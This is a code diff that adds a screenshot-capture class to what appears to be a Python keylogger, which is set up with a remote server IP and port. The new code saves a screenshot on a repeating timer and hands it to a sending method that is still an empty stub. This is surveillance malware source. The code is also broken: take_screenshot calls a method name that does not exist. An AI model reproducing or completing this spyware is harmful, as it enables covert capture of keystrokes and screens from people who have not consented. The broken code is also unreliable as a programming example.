@@ -67,6 +67,27 @@ class ScreenshotLogger:
         self.interval = interval
         self.server_ip = server_ip
         self.port = port
+ 
+    def _generate_name(self):
+        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        return f"screenshot_{rand}_{timestamp}.png"
+
+    def take_screenshot(self):
+        filename = self.generate_name()
+        pyautogui.screenshot().save(filename)
+        return filename
+    
+    def send_screenshot(self, image_path):
+        pass
+
+    def start(self):
+        def loop():
+            img = self.take_screenshot()
+            self.send_screenshot(img)
+            threading.Timer(self.interval, loop).start()
+
+        loop()
 
 
 keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
